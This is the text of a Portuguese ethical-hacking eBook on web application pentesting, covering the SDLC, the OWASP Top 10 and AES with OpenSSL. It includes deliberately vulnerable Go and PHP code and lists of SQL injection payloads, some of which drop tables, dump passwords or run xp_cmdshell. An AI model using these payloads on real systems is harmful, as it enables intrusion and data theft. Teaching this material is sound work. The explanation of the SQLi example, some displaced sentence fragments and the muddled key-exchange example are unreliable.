--- Começo do arquivo: eBook - Teste de Aplicações Web.pdf ---

 
 
APRESENTAÇÃO 
 
Seja bem-vindo(a) ao mundo fascinante e desafiador do Ethical Hacker.  
Este e-Book apresenta uma metodologia de verificação da segurança por meio da 
simulação de ataques reais, explorando as vulnerabilidades de um ambiente, plataforma 
ou sistema, os quais são reconhecidamente os principais meios explorados para roubo de 
informações confidenciais e invasão de ambientes corporativas. 
Para ser um profissional de pentest e encontrar vulnerabilidade em aplicações web, é 
preciso muito mais do que utilizar ferramentas automatizadas: são necessários 
conhecimentos diferenciados e técnicas avançadas que permitam a compreensão ampla 
de cenários de vulnerabilidades. 
As lições deste e-book são importantes tanto para profissionais da área de 
desenvolvimento quanto para os de segurança. Todas as partes envolvidas no 
desenvolvimento de aplicações modernas precisam entender como a segurança se alinha 
ao ciclo de vida do desenvolvimento. Alinhamento mais forte leva à seleção de melhores 
ferramentas e à criação de melhores práticas adaptadas especificamente para as 
necessidades de segurança das aplicações.  
Desejo que você tenha uma experiência de aprendizado transformadora. 
Boa leitura e estudos! 
Prof. Vitor Luiz Ramos Barbosa 
 
 

 
 
OBJETIVOS 
 
OBJETIVO GERAL 
• Adquirir o conhecimento sobre técnicas, padrões internacionais e ferramental para 
realização de testes de invasão em aplicações web. 
OBJETIVOS ESPECÍFICOS 
• Compreensão dos conceitos fundamentais de uma aplicação Web; 
• Conhecer as principais metodologias e ferramentas para testes em uma aplicação 
Web; 
• Identificar e explorar as principais vulnerabilidades em aplicações Web modernas; 
• Executar teste de segurança em aplicações web reais; 
• Compreender soluções para teste automatizados de aplicações Web; 
• Implementar medidas corretivas para as vulnerabilidades em aplicações Web 
exploradas; 
• Exploração e testes de segurança em APIs; 
• Práticas éticas e legais; 
• Trabalho em equipe e comunicação; 
• Liderança de projetos de teste em aplicações web. 
 
Como este e-Book foi organizado? 
 
• Unidade 1: Fundamentos de segurança em aplicação Web 
• Unidade 2: Reconhecimento do alvo 
• Unidade 3: Offensive Security 
• Unidade 4: Teste de vulnerabilidade em APIs 
• Unidade 5: Ameaças emergentes 
 
 

 
 
UNIDADE 1 - Fundamentos de Segurança em Aplicações Web 
Nesta unidade, teremos a oportunidade de conhecer e aprofundar nossos conhecimentos 
sobre a arquitetura e funcionalidades de aplicações web modernas, bem como entender 
os riscos de segurança envolvidos em cada etapa do seu desenvolvimento. 
OBJETIVOS DA UNIDADE 
Ao final desta unidade, você conhecerá: 
• O histórico de segurança em aplicações web, o ciclo de desenvolvimento seguro 
de software e arquitetura de aplicações web. 
• Entender sobre o OWASP, Encriptação, Codificação e Protocolo HTTP. 
• Aprender sobre as metodologias para de teste de vulnerabilidade em aplicações 
web 
• Configurar seu ambiente com as ferramentas essenciais para testes em aplicações 
Web. 
• Conhecer melhor cada ameaça para as aplicações web. 
 

 
 
1.1 O Histórico das Aplicações Web 
Há mais de 30 anos atrás Timothy John Berners-Lee, um cientista da computação 
britânico que trabalhava com pesquisas nucleares criou a World Wide Web, primeiro nome 
dado a atual Internet, implementou junto com alguns amigos a primeira comunicação bem-
sucedida entre um cliente HTTP e o servidor através de uma rede de computadores de 
longa distância. 
O primeiro site foi construído no CERN (Organização Europeia para a Investigação 
Nuclear) e foi posto online em 6 de agosto de 1991 pelo endereço https://info.cern.ch/. 
Acredite, ele está no ar até hoje do mesmo jeito que foi criado. 
 
Curiosidade em relação a Primeira Aplicação Web 
• Propósito: O site servia para descrever o projeto World Wide Web e explicava 
conceitos como hipertexto, HTTP, URLs e HTML. Também incluía informações 
sobre como usar um navegador web e configurar um servidor web. 
• Conteúdo: O site contém texto explicativo e links para outras páginas e recursos 
relacionados ao projeto da web. 
Tecnologias utilizadas na época 
• HTML: A primeira página web foi escrita em HTML (HyperText Markup Language), 
que é a linguagem de marcação padrão para a criação de páginas web. 
• HTTP: O protocolo HTTP (HyperText Transfer Protocol) foi usado para transferir 
informações entre o servidor e o cliente. 

 
 
• Servidor Web: Tim Berners-Lee usou um computador NeXT como o primeiro 
servidor web. 
 
 
Embora a simplicidade da primeira aplicação web se comparada com as aplicações 
dinâmicas de hoje em dia que rodam nos mais diversos tipos de dispositivos, ela teve sua 
importância para os fundamentos da web moderna.  
A aplicação trouxe o uso de hipertexto para ligar documentos, um conceito que permitiu a 
navegação entre páginas web através de links, a aplicação também foi o início da World 
Wide Web, uma plataforma que cresceu exponencialmente para se tornar a base da 
internet como a conhecemos hoje. 
 
Características das páginas estáticas iniciais 
O conteúdo das primeiras aplicações web era fixo e não mudava a menos que o 
desenvolvedor editasse manualmente o código HTML. Não havia interação com bancos 
de dados ou geração dinâmica de conteúdo. 
O estilo das páginas eram simples, muitas vezes sem folhas de estilo (CSS). Quando o 
CSS começou a ser usado, ele permitiu uma melhor separação entre o conteúdo e a 
apresentação. 
A interatividade era quase inexistente. Não havia JavaScript ou outras tecnologias client-
side para manipulação dinâmica da página. Qualquer forma de interatividade limitada era 
feita por formulários HTML que enviavam dados para o servidor. 

 
 
As páginas carregavam rapidamente porque eram simples e leves, consistindo em texto, 
imagens básicas e, eventualmente, alguns estilos rudimentares e eram projetadas para 
serem compatíveis com os navegadores da época, como Mosaic, Netscape Navigator e 
as primeiras versões do Internet Explorer. 
1.2 Ciclo de Desenvolvimento de Software Seguro 
O ciclo de vida de desenvolvimento de software (SDLC) é o processo econômico e rápido 
que as equipes de desenvolvimento usam para projetar e criar software de alta qualidade. 
O objetivo do SDLC é minimizar os riscos do projeto por meio do planejamento antecipado, 
para que o software atenda às expectativas do cliente durante e depois da produção. Essa 
metodologia descreve uma série de etapas que dividem o processo de desenvolvimento 
de software em tarefas que você pode atribuir, concluir e avaliar. 
Por que o SDLC é importante? 
O gerenciamento do desenvolvimento de software pode ser desafiador, devido às 
alterações dos requisitos, as atualizações na tecnologia e a colaboração multifuncional. A 
metodologia do ciclo de vida de desenvolvimento de software (SDLC) oferece uma 
estrutura de gerenciamento sistemática, com produtos específicos em cada estágio do 
processo de desenvolvimento do software. Como resultado, todos os participantes do 
processo concordam antecipadamente com as metas e os requisitos do desenvolvimento 
do software e têm um plano para alcançar essas metas. 
Alguns benefícios do SDLC: 
• Maior visibilidade do processo de desenvolvimento para todas as partes envolvidas 
• Estimativa, planejamento e programação eficientes 
• Melhor gerenciamento de riscos e estimativa de custos 
• Entrega sistemática do software e maior satisfação do cliente 
Como o SDLC funciona? 
O ciclo de vida do desenvolvimento de software (SDLC) destaca várias tarefas 
necessárias para criar uma aplicação de software. O processo de desenvolvimento passa 

 
 
por vários estágios, à medida que os desenvolvedores adicionam novos recursos e 
corrigem bugs no software. 
Os detalhes dos processos do SDLC variam para diferentes equipes. Porém, destacamos 
abaixo algumas fases comuns do SDLC: 
Planejamento 
A fase de planejamento normalmente inclui tarefas como a análise do custo-benefício, a 
programação, a estimativa e a alocação de recursos. A equipe de desenvolvimento coleta 
requisitos de várias partes envolvidas, como clientes, especialistas internos e externos e 
gerentes, a fim de criar um documento de especificação de requisitos do software. 
O documento define as expectativas e as metas comuns que ajudarão no planejamento 
do projeto. A equipe estima os custos, cria uma programação e tem um plano detalhado 
para atingir suas metas. 
Ferramentas: Microsoft Project, JIRA, Asana. 
Design 
Na fase de design, os engenheiros de software analisam os requisitos e identificam as 
melhores soluções para criar o software. Por exemplo, eles poderão considerar a 
integração de módulos pré-existentes, fazer escolhas tecnológicas e identificar 
ferramentas de desenvolvimento. Eles analisarão qual a melhor forma de integrar o novo 
software às infraestruturas de TI existentes que a organização já tiver  
Ferramentas: UML, Microsoft Visio, Lucidchart, Miro. 
 
Desenvolvimento 
Na fase de implementação, a equipe de desenvolvimento codifica o produto. Eles 
analisam os requisitos para identificar as tarefas de codificação menores que podem 
realizar diariamente para alcançar o resultado. 

 
 
Ferramentas: IDEs como Visual Studio, Eclipse, IntelliJ IDEA, Veracode, Red Hat 
Dependecy Analisys, Veracode, Checkmarx, Arnica. 
Teste 
A equipe de desenvolvimento combina testes manuais e automatizados para identificar 
bugs no software. A análise de qualidade inclui testar o software para identificar erros e 
verificar se ele atende aos requisitos do cliente. Como muitas equipes testam o código 
que desenvolvem, a fase de teste pode ocorrer em paralelo à fase de desenvolvimento. 
Ferramentas: Selenium, JUnit, TestNG, Veracode, CheckMArx, Arnica, Qualys, BurpSuite 
Implantação 
Quando as equipes desenvolvem software, eles criam e testam o código em uma cópia 
do software diferente daquela à qual os usuários têm acesso. O software usado pelo 
cliente é considerado em produção, enquanto outras cópias são consideradas como o 
ambiente de compilação ou ambiente de teste. 
O uso de ambientes de compilação e produção separados garante que os clientes possam 
continuar a usar o software, mesmo quando ele estiver sendo alterado ou atualizado. A 
fase de implantação inclui várias tarefas para mover a cópia mais recente para o ambiente 
de produção, como empacotamento, configuração de ambientes e instalação. 
Ferramentas: Jenkins, Docker, Kubernetes, Prisma Cloud. 
Manutenção 
Na fase de manutenção, entre outras tarefas, a equipe corrige bugs, soluciona problemas 
do cliente e gerencia as alterações do software. Além disso, a equipe monitora a 
performance geral do sistema, a segurança e a experiência do usuário para identificar 
novas formas de melhorar o software existente. 
Ferramentas: JIRA, ServiceNow, Chronicle, Splunk. 
 
O que são os modelos de SDLC? 

 
 
Um modelo de ciclo de vida de desenvolvimento de software (SDLC) apresenta 
conceitualmente o SDLC de forma organizada para ajudar as empresas a implementá-lo. 
Diferentes modelos organizam as fases do SDLC em ordens cronológicas variadas, a fim 
de otimizar o ciclo de desenvolvimento. Analisaremos abaixo alguns modelos de SDLC 
mais usados: 
Cascata 
O modelo cascata organiza todas as fases sequencialmente, de forma que cada fase nova 
dependa do resultado da fase anterior. Conceitualmente, o design flui de uma fase para a 
outra, como uma cascata. 
Prós e contras 
O modelo cascata proporciona disciplina para o gerenciamento de projetos e oferece um 
resultado tangível ao final de cada fase. Porém, não é possível fazer alterações depois 
que uma fase for concluída, pois as alterações podem afetar o tempo de entrega, os custos 
e a qualidade do software. Portanto, esse modelo é mais adequado para pequenos 
projetos de desenvolvimento de software, nos quais é mais fácil organizar e gerenciar 
tarefas e os requisitos podem ser predefinidos com precisão. 
Ágil 
O modelo ágil organiza as fases do SDLC em vários ciclos de desenvolvimento. A equipe 
itera as fases rapidamente, fazendo apenas alterações pequenas e incrementais ao 
software em cada ciclo. Eles avaliam continuamente os requisitos, planos e resultados 
para que possam responder rapidamente às alterações. O modelo ágil é iterativo e 
incremental, o que o torna mais eficiente do que outros modelos de processo. 
Prós e contras 
Os ciclos de desenvolvimento rápidos ajudam as equipes a identificar e resolver questões 
antecipadamente em projetos complexos, antes que elas se tornem problemas 
significativos. Eles também podem envolver clientes e outras partes interessadas para 
obter feedback em todo o ciclo de vida do projeto. Porém, a dependência exagerada do 

 
 
feedback de clientes pode levar a alterações excessivas no escopo ou ao encerramento 
prematuro do projeto. 
 
DevOps 
DevOps é uma metodologia que integra desenvolvimento (Dev) e operações (Ops) para 
melhorar a colaboração e a produtividade através da automação de processos, integração 
contínua e entrega contínua. 
Princípios do DevOps 
• Integração Contínua (CI): 
o Código é frequentemente integrado ao repositório compartilhado, permitindo 
detecção rápida de problemas. 
o Ferramentas: Jenkins, GitLab CI, Travis CI. 
• Entrega Contínua (CD): 
o Automatização do lançamento do código integrado no ambiente de 
produção. 
o Ferramentas: Jenkins, CircleCI, Bamboo. 
• Infraestrutura como Código (IaC): 
o Gerenciamento e provisionamento da infraestrutura através de scripts de 
código. 
o Ferramentas: Terraform, Ansible, AWS CloudFormation. 
• Monitoramento e Logging: 
o Monitoramento contínuo das aplicações e infraestrutura para detectar e 
resolver problemas rapidamente. 
o Ferramentas: Prometheus, Grafana, ELK Stack (Elasticsearch, Logstash, 
Kibana). 
SSDLC (Secure Software Development Life Cycle) 
O SSDLC é a integração de práticas de segurança em todas as fases do SDLC para 
garantir que o software desenvolvido seja seguro. 

 
 
Etapas do SSDLC 
Treinamento em Segurança 
Capacitar desenvolvedores em práticas de codificação segura, programas como o 
Security Champions podem ajudar nesta iniciativa. 
Planejamento 
Identificar e definir os requisitos de segurança no início do projeto. 
Ferramentas: OWASP SAMM, Microsoft SDL. 
Design Seguro 
Inclusão de controles de segurança no design do sistema. 
Ferramentas: Threat Dragon ou Microsoft Threat Modeling Tool. 
Desenvolvimento Seguro 
Desenvolvimento do código com práticas de codificação segura, o aprendizado obtido no 
Security Champions colabora nesta etapa. 
Ferramentas: IDEs com plugins de segurança, como Checkmarx, SonarQube. 
Testes de Segurança 
Realização de testes de segurança como análise estática e dinâmica de código, Pentest, 
ou mesmo análise manual de código pelo time de Apllication Security, são boas práticas 
que compõe esta etapa. 
Ferramentas: Burp Suite, OWASP ZAP, Veracode. 
Resposta a Incidentes de Segurança 
Preparação para lidar com incidentes de segurança através de planos de resposta e 
recuperação. 
Ferramentas: Splunk, IBM QRadar, Salt, Arxan. 

 
 
Manutenção e Monitoramento de Segurança: 
Monitoramento contínuo para identificar e corrigir vulnerabilidades. O processo de 
automatização de tarefas é fundamental nesta fase dada o volume de ataque que as 
instituições recebem diariamente. 
Ferramentas: SIEM tools, como Splunk, AlienVault. 
 
1.3 Arquitetura de Aplicações Web 
 
1.4 Metodologia para teste de vulnerabilidade 
O que é Pentest e quais são os tipos? 
O Pentest é uma avaliação de segurança cibernética que simula um ataque real às 
aplicações e sistemas, com o objetivo de identificar brechas e fraquezas que poderiam ser 
exploradas por invasores. Existem três principais categorias desta metodologia, o White 
Box, o Black Box e o Grey Box. 
White Box: nesse tipo, os testadores têm total conhecimento sobre a infraestrutura, 
código-fonte e arquitetura da aplicação. Isso permite uma análise aprofundada, focando 
em identificar vulnerabilidades conhecidas e desconhecidas. 
Black Box: por sua vez, nesta categoria, os profissionais têm conhecimento zero sobre a 
infraestrutura e sistemas da aplicação. Eles abordam o teste de maneira semelhante a um 
atacante real, identificando vulnerabilidades que poderiam ser exploradas externamente. 
Grey Box: por fim, na caixa cinza, os testadores têm um conhecimento parcial sobre 
determinadas partes de um sistema, mas não como um todo. Isso combina as abordagens 
White e Black Box, permitindo uma análise mais realista e abra Benefícios do Pentest para 
Aplicações Web 
 

 
 
Os benefícios do Pentest para aplicações web são inúmeros, como: 
• Identificar e corrigir vulnerabilidades antes que sejam exploradas por invasores 
maliciosos; 
• Proteger a reputação da empresa, evitando o vazamento de dados confidenciais; 
• Conformidade com regulamentações do setor; 
• Ter a segurança como parte do ciclo de desenvolvimento; 
• Prevenção 
contra 
ataques 
cibernéticos, 
evitando 
perdas 
financeiras, 
consequências judiciais e outras questões; 
• Desenvolver uma postura de segurança abrangente. 
 
 
Metodologia 
Existem diversas metodologias possíveis ligadas ao Pentest para Aplicações Web, mas a 
OWASP, um dos principais órgãos internacionais de segurança cibernética, contém algum 
dos frameworks mais completos, sendo amplamente utilizados. Alguns deles são: 
 
OWASP Top 10: este documento reúne as 10 principais vulnerabilidades de aplicações 
web, e traz informações importantíssimas sobre elas, incluindo recomendações para 
correção e prevenção. 
OWASP Testing Guide: este é um guia de testes que fornece uma estrutura bem 
detalhada, incluindo técnicas e recomendações, para testes de segurança em aplicações 
web. 
OWASP Application Security Verification Standard: este documento traz uma base 
para testar controles de segurança de aplicações web, além de apontar requisitos para o 
desenvolvimento seguro. 
 

 
 
Outras metodologias que podem ser utilizadas são: 
PTES (Penetration Testing Execution Standard): um padrão para testes de intrusão, 
que abrange diversas áreas. 
NIST SP 800-115: framework do NIST (Instituto Nacional de Padrões e Tecnologia, dos 
Estados Unidos) com recomendações sobre testes em aplicações web. ngente das 
vulnerabilidades. 
 
1.5. Framework OWASP 
O Open Web Application Security Project, ou OWASP, é uma organização internacional 
sem fins lucrativos dedicada a segurança de aplicativos web.  
Um dos princípios fundamentais do OWASP é que todos os seus materiais estejam 
disponíveis gratuitamente e facilmente acessíveis em seu site, tornando possível para 
qualquer pessoa melhorar a segurança de seus próprios aplicativos web.  
Os materiais que eles oferecem incluem documentação, ferramentas, vídeos e fóruns. 
Talvez seu projeto mais conhecido seja o OWASP Top 10. 
O que é OWASP Top 10? 
O OWASP Top 10 é um relatório atualizado regularmente que descreve questões de 
segurança para aplicações web, com foco nos 10 riscos mais críticos. O relatório é 
elaborado por uma equipe de especialistas em segurança de todo o mundo.  
O OWASP refere-se ao Top 10 como um "documento de conscientização" e recomenda 
que todas as empresas incorporem o relatório em seus processos, a fim de minimizar e/ou 
mitigar os riscos de segurança. 
Sua última versão foi lançada em 2021 e conta com os seguinte elementos: 

 
 
 
A01:2021 – Broken Access Control - Controle de Acesso Quebrado 
Ocorre quando o controle de acesso não aplica a política de modo que os usuários não 
possam agir fora das permissões predefinidas.  
Aqui estão alguns exemplos do que podemos considerar ser "acesso": 
• Acesso a um painel de controle/administrativo de hospedagem; 
• Acesso a um servidor via FTP/SFTP/SSH; 
• Acesso ao painel administrativo de um site; 
• Acesso a outras aplicações no ambiente; 
• Acesso a uma base de dados. 
A seguir apresento um exemplo de aplicação vulnerável escrita em golang. Nela o código 
verifica apenas se o usuário tem um papel (role) definido, mas não impõe restrições sobre 
qual papel é necessário para acessar a rota /admin. 
 1. package main 
 2. import ( 
 3.  
"fmt" 
 4.  
"net/http" 
 5. ) 
 6.   
 7. func main() { 
 8.  
http.HandleFunc("/admin", adminHandler) 
9.  
http.ListenAndServe(":8080", nil) 
10. }  
11. // Handler para a rota /admin, vulnerável a Broken Access Control 
12. func adminHandler(w http.ResponseWriter, r *http.Request) { 
13.  
userRole := r.Header.Get("Role") // Obtém a role do usuário a partir do header 
14.   
15.  
// Verifica se o usuário está autenticado (mas não verifica o papel) 

 
 
16.  
if userRole != "" { 
17.  
 
fmt.Fprintf(w, "Bem-vindo à página de administração, %s!", userRole) 
18.  
} else { 
19.  
 
http.Error(w, "Acesso negado", http.StatusUnauthorized) 
20.  
} 
21. } 
No caso acima qualquer usuário que enviar um cabeçalho com a role na requisição pode 
acessar o endpoint /admin, mesmo que não seja um administrador. 
Exemplo de código seguro 
 1. package main 
 2. import ( 
 3.  
"fmt" 
 4.  
"net/http" 
 5. ) 
 6. func main() { 
 7.  
http.HandleFunc("/admin", adminHandler) 
 8.  
http.ListenAndServe(":8080", nil) 
 9. } 
10. // Handler para a rota /admin, corrigido para verificar o papel do usuário 
11. func adminHandler(w http.ResponseWriter, r *http.Request) { 
12.  
userRole := r.Header.Get("Role") // Obtém a role do usuário a partir do header 
13.  
// Verifica se o usuário é um administrador 
14.  
if userRole == "admin" { 
15.  
 
fmt.Fprintf(w, "Bem-vindo à página de administração, %s!", userRole) 
16.  
} else { 
17.  
 
http.Error(w, "Acesso negado", http.StatusForbidden) 
18.  
} 
19. } 
20.   
No exemplo acima o código foi corrigido para verificar o papel (role) do usuário antes de 
acessar o recurso. 
 
A02:2021 – Cryptographic Failures – Falhas de Criptografia 
Dados sensíveis devem ser transmitidos, armazenados e exibidos requerem proteção de 
segurança extra, a Criptografia. Quando esta categoria de dados pode revelar dados 
pessoais, números de cartões de crédito, segredos de negócio, senhas, etc. 

 
 
Mesmo que os dados sejam criptografados, eles ainda podem ser quebrados devido a 
áreas fracas como: 
• Processo de geração de chaves 
• Processo de gerenciamento de chaves 
• Uso de algoritmo 
• Uso de protocolo 
• Uso de cifra 
• Técnicas de armazenamento de hashing de senha 
A03:2021 – Injection – Injeção  
Uma injeção de código ocorre quando um atacante envia dados inválidos para a aplicação 
web com a intenção de fazer algo que ela não foi projetado/ programado para fazer. 
Talvez o exemplo mais comum em torno desta vulnerabilidade de segurança seja a 
consulta SQL que consome dados não confiáveis. 
Foi por décadas a maior dor de cabeça dos profissionais de segurança da informação de 
todo mundo, mas vem perdendo consideravelmente seu efeito com o uso de frameworks, 
ORMs e bibliotecas que aplicam nativamente sanitizações ou consultas parametrizadas 
aos bancos dados. 
Abaixo trago um exemplo de código vulnerável ao tópico A03:2021, repare nos 
comentários do textos as informações sobre cada bloco de código: 
 <?php 
// Conexão ao banco de dados 
$servername = "localhost"; 
$username = "root"; 
$password = "password"; 
$dbname = "test_db"; 
  
$conn = new mysqli($servername, $username, $password, $dbname); 
  
// Verifica o estado da conexão 
if ($conn->connect_error) { 
    die("Falha na conexão: " . $conn->connect_error); 
} 

 
 
  
// Obtém o ID do usuário da URL 
$user_id = $_GET['id']; 
  
// Consulta SQL vulnerável ao A03:2021 – Injection. Neste caso a SQL Injection, pois o desenvolvedor 
inclui diretamente o valor de $_GET['id'] na consulta SQL sem qualquer forma de validação ou 
sanitização. 
$sql = "SELECT * FROM users WHERE id = '$user_id'"; 
  
$result = $conn->query($sql); 
  
if ($result->num_rows > 0) { 
    while($row = $result->fetch_assoc()) { 
        echo "ID: " . $row["id"]. " - Nome: " . $row["name"]. " - Email: " . $row["email"]. "<br>"; 
    } 
} else { 
    echo "0 resultados"; 
} 
  
$conn->close(); 
?> 
Exemplo de Exploração 
Se a URL for algo como http://www.urlvulneravel.com/user.php?id=1, um atacante 
pode modificar para: http://example.com/user.php?id=1 OR 1=1. Isso faria com que a 
consulta SQL se tornasse: SELECT * FROM users WHERE id = '1 OR 1=1'. O que 
resultaria em todos os registros da tabela users sendo retornados, isso porque se analisarmos 
matematicamente a expressão o atacante utiliza lógica booleana, onde o resultado do valor 
informado é verdadeiro e satisfaz a solicitação, para ficar mais claro, vamos entender como uma 
operação booleana funciona. 
• 
Operadores Lógicos: 
o OR é o operador lógico "ou" que resulta em true se pelo menos uma das condições 
informadas for verdadeira. 
o = é o operador de igualdade que verifica se duas expressões são iguais, resultando 
em true ou false. 
• 
Análise da Expressão: 
o 1=1 é uma condição de igualdade. Como 1 é igual a 1, a expressão 1=1 é true. 
o Se convertemos 1 OR 1=1 temos true OR true como resposta. 
• 
Resultado de OR: 

 
 
o true OR true é true porque, no operador OR, se qualquer um dos operandos é 
true, o resultado é true. 
Ataques de SQL Injection podem ser utilizado para outros funcionalidades, por exemplo: 
• 
Bypass em mecanismos de autenticação 
o 1' OR '1'='1 
o admin' – 
o admin' # 
o admin' OR 1=1 – 
o ' OR ''=' 
As strings de exemplos tentam forçar a consulta SQL a retornar verdadeiro, permitindo o acesso 
sem credenciais válidas. 
• 
Extração de Dados 
o '; DROP TABLE users; -- 
o ' UNION SELECT username, password FROM users -- 
o ' UNION SELECT null, version(); -- 
o ' 
AND 
1=0 
UNION 
ALL 
SELECT 
null, 
table_name 
FROM 
information_schema.tables -- 
o ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 
1, 1) = 'a' -- 
Estas strings são usadas para manipular uma consulta para executar comandos adicionais, como 
excluir uma tabela ou fazer um dump de dados. 
• 
Obtenção de Informações do Banco de Dados 
o ' OR 1=1; -- 
o '; EXEC xp_cmdshell('dir'); -- 
o ' UNION SELECT 1, @@version -- 
o ' UNION SELECT null, null, null, table_name FROM information_schema.tables -- 
o ' UNION ALL SELECT NULL, NULL, NULL, COLUMN_NAME FROM 
INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users' -- 
Estas consultas podem ser utilizadas para obter informações sobre a versão do banco de dados, 
estrutura de tabelas e colunas, tais informações contribuem para levantamento de informações 
que podem ser explorada pelo atacante com técnicas adicionais. 

 
 
• 
Detecção de SQL Injection 
o ‘ 
o ‘ AND 1=1 -- 
o ‘ AND 1=2 -- 
o ‘ ORDER BY 1 -- 
o ‘ OR EXISTS(SELECT 1) -- 
o ‘ HAVING 1=1 -- 
Estas strings são usadas para verificar a presença de vulnerabilidades de SQL Injection no 
sistema. Uma ‘ (aspa simples), pode não ser tratada pela aplicação e gerar mensagem de erros.  
A04:2021 – Insecure Design – Design Inseguro 
Design inseguro é uma categoria ampla que representa diferentes fraquezas, expressas 
como "design de controle ausente ou ineficaz”. Ao optar por não adicionar a segurança 
desde o início de um projeto pode sujeitar a aplicação a ter um design inseguro. 
Mesmo uma aplicação sendo implementado sob um olhar de segurança e melhores 
práticas. Um design inseguro não pode ser corrigido por uma implementação perfeita, 
pois, por definição, os controles de segurança necessários nunca foram criados para se 
defender contra ataques específicos. 
Incluir segurança na fase de ideação e planejamento de produtos, realizar benchmarks, 
modelar as ameaças que aquela nova aplicação está sujeito são estágios fundamentais 
para mapear riscos de segurança e evitar um design inseguro. 
A05:2021 – Security Misconfiguration – Erro de configuração de seguraça 
Qualquer má configuração de mecanismos de proteção que podem causar um ataque a 
aplicação web, pode ser configurado Security Misconfiguration. Por exemplo: 
• Patches não aplicados 
• Configuração padrão de recursos 
• Recursos obsoletos ou não-utilizáveis em produção 
• Arquivos ou diretórios não protegidos 
• Uso de contas de superusuário em produção 

 
 
A complexidade de se evitar essa falha é grande, pois envolve revisão e refinamento das 
configurações de segurança em todos recursos, aplicações, plataformas, banco de dados, 
infraestrutura que envolvem um aplicação. 
A06:2021 – Vulnerable and Outdated Components – Componentes vulneráveis ou 
desatualizados 
Hoje cerca de 90% das aplicações utilizam códigos plugins e extensões de terceiros. 
Deixar de atualizar todos os componentes no backend e frontend de uma aplicação web 
traz riscos de segurança que podem ser explorados mais cedo ou mais tarde.  
Os atacantes buscam ativamente sites que usam componentes vulneráveis e os exploram 
massivamente para espalhar malware, spam e phishing. 
A07:2021 – Identification and Authorization Failures – Falhas de Identificação e 
Autorização 
Autenticação quebrada geralmente se refere a problemas de lógica que ocorrem no 
mecanismo de autenticação do aplicativo, Como um gerenciamento de sessão ruim 
propenso a enumeração de nomes de usuário - quando um ator malicioso usa técnicas de 
força bruta para adivinhar ou confirmar usuários válidos em um sistema. 
Para minimizar os riscos de falha de autenticação, evite deixar a página de login para 
administradores publicamente acessível a todos os visitantes do site: 
• /administrador no Joomla! 
• /wp-admin/ no WordPress 
• /index.php/admin no Magento 
• /user/login no Drupal. 
A08:2021 – Software and Data Integrity Failures -Falhas na Integridade de Dados e 
Softwares 
Essas falhas podem assumir muitas formas, especialmente porque à medida que a web 
evolui, é cada vez mais comum usar código e serviços de terceiros dentro das aplicações. 
Estas falhas podem ser resumidas da seguinte forma: 

 
 
• Uso de código que não verifica a integridade da fonte; 
• Uso de plugins de terceiros onde você não controla a fonte; 
• Plugins e extensões de fontes não confiáveis; 
• A introdução de ou potencial para comprometimento ou acesso não autorizado; 
• As atualizações automáticas assumem a confiança da fonte. 
A09:2021 – Security Loggings and Monitoring Failures – Falhas de Segurança no 
Monitoramento de Logs 
Sem Logs e monitoramento, as violações não podem ser detectadas. O registro, a 
detecção, o monitoramento e a resposta ativa insuficientes ocorrem em qualquer 
momento. 
 
A10:2021 – Server-side Request Forgery – Requisição Forjada do Lado do Servidor 
Ocorre sempre que uma aplicação web está buscando um recurso remoto sem validar a 
URL fornecida pelo usuário. Ela permite um atacante forjar a aplicação para enviar uma 
solicitação criada para um destino inesperado, mesmo quando protegido por um firewall, 
VPN ou outro tipo de lista de controle de acesso à rede (ACL). 
1.6. Encriptação 
Processo de converter dados legíveis (texto claro) em uma forma codificada (texto cifrado) 
para que apenas pessoas autorizadas possam lê-los. É como trancar uma mensagem em 
um cofre que só pode ser aberto com a chave certa. 
Cifra 
São algoritmos usados na encriptação para transformar o texto claro em texto cifrado e 
vice-versa. Existem dois tipos principais de cifras: simétricas (mesma chave para 
encriptar e decriptar) e assimétricas (chaves diferentes para encriptar e decriptar). 

 
 
 
Cifra Simétrica 
A cifra é simétrica ou (chave secreta) quando a mesma chave é utilizada para cifragem e 
decifragem da mensagem, ou seja, as duas são iguais. Por esse motivo, as chaves devem 
ser conhecidas apenas pelas partes que realizam a comunicação. 
Os algoritmos desse tipo de cifragem são rápidos e utilizam chaves relativamente 
pequenas.  
Um problema desses esquemas, porém, é que o número de chaves em uma rede tende 
a ser grande em uma organização em que troca de mensagens confidenciais são 
frequentes e utilizadas por diversos usuários. Neste caso a gestão fica complexa e torna-
se necessário a aquisição ou implementação de uma solução de KMS (Key Management 
System). 
Outro problema fundamental nesse esquema é a forma que as chaves são distribuídas, 
isto é, como duas entidades podem partilhar uma chave sem que uma terceira parte não 
autorizada tome conhecimento dela. Essa troca de chaves pode ser feita presencialmente, 
ou por meio de um KMS, por exemplo. 
O AES ou Advanced Encryption Standard é uma cifra simétrica de blocos adotado pelo 
governo norte-americano, que especifica o algoritmo Rijndael, operando sobre blocos de 
dados de 128 bits e com chaves de 128, 192 ou 256 bits.  
Gerando chaves AES 

 
 
O primeiro passo antes de se utilizar uma cifra simétrica na proteção do sigilo de 
informações é gerar uma chave o mais aleatória possível e distribuí-la seguramente a 
todas as partes autorizadas. 
Exemplo prático de uso de cifra simétrica: 
1. Alice deseja comunicar com Bob em sigilo, então ela envia sua chave simétrica Bob 
2. Bob encripta sua mensagem com a chave secreta de Alice e encaminha para ela 
em um canal seguro. 
3. Alice obtem a mensagem de Beto e usa sua chave secreta para decifrá-la. 
Neste exemplo, irei utilizar o comando rand, do OpenSSL, para a geração de uma chaves 
de 128 bits: 
openssl rand –hex 16 
A saída do comando deve corresponder a uma cadeia de 32 dígitos hexadecimal, que 
totaliza 128 bits, e pode ser empregada como chave de um AES-128. 
Cifrando mensagens 
O comando a seguir irá cifrar um arquivo com o algoritmo AES, usando uma chave de 128 
bits, no modo de operação CBC, é: 
openssl aes-128-cbc –in <arquivo a ser cifrado> -out <arquivo 
cifrado> -K <chave em hexadecimal> -iv <vetor de inicialização> 
Decifrando mensagens 
O comando para decifrar mensagens com o algoritmo AES, usando uma chave de 128 
bits, no modo de operação CBC, é: 
openssl aes-128-cbc –d –in <arquivo cifrado> -out <arquivo 
decifrado> -K <chave em hexadecimal> -iv <vetor de inicialização> 
Cifra assimétrica 

 
 
Uma cifra é denominada assimétrica quando são utilizadas chaves diferentes para 
cifragem (chave pública) e decifragem (chave privada), mas que são matematicamente 
relacionadas. Note que no processo de criação de cifra assimétrica as duas chaves são 
criadas em conjunto (pares).  
Somente a chave privada precisa ser mantida em sigilo e, naturalmente, deve ser 
computacionalmente improvável recuperá-la a partir da chave pública, que pode ser 
distribuída livremente. 
